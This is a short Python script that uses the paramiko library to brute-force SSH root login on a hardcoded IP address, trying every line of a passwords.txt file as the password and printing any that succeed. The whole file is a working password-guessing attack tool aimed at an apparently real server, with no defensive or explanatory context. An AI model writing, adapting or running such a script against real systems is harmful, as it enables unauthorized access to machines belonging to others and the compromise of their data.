import paramiko
#import ssh2
def connect():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    f = open('passwords.txt','rb')
    text = f.read().decode('utf-8')
    sship = text.split("\n")
    for i in range(0,len(sship)):
            try:
              client.connect('209.38.218.5', port=22, username='root', password=sship[i])
              print ('[+] 209.38.218.5  -->'+sship[i]+"\n")
              client.close()
            except paramiko.ssh_exception.AuthenticationException:
              client.close()
              print('[-] 209.38.218.5  no')
if __name__ == '__main__':
    connect()
